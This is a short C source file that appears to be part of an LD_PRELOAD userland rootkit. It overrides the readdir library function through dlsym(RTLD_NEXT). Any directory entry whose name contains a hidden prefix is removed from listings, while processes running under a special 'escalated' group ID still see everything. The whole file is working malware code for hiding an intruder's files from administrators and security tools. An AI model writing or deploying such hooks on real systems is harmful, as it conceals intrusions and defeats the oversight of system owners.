#include "utils.h"

struct dirent *(*original_readdir)(DIR *);
struct dirent *readdir(DIR *dirp)
{
    struct dirent *ret;

    // obtain real pointer to readdir function.
    original_readdir = dlsym (RTLD_NEXT, "readdir");

    // if escalator used readdir, allow retrieving correct information.
    if(getegid() == ESCALATED_GID){
        return original_readdir(dirp);
    }

    // otherwise, iterate over the given dir ignoring the prefix provided.
    while((ret = original_readdir(dirp)))
    {
        if(strstr(ret->d_name,HIDDEN_PREFIX) == 0 )
            break;
    }
    return ret;
}